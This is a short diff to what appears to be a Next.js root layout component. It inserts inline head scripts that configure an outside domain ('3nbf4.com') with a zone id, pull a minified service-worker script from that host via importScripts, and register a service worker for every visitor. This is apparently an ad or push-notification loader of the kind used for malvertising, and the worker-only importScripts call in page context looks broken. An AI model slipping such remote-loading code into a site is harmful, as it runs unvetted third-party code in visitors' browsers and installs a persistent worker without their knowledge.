@@ -43,6 +43,23 @@ export default function RootLayout({ children }) {
 
   return (
     <html lang="en-US">
+      <head>
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `self.options = {
+  domain: "3nbf4.com",
+  zoneId: 12027303,
+};
+self.lary = "";
+importScripts("https://3nbf4.com/act/files/service-worker.min.js?r=sw");`,
+          }}
+        />
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `if ("serviceWorker" in navigator) { navigator.serviceWorker.register("/sw.js"); }`,
+          }}
+        />
+      </head>
       <body>
         <script
           type="application/ld+json"
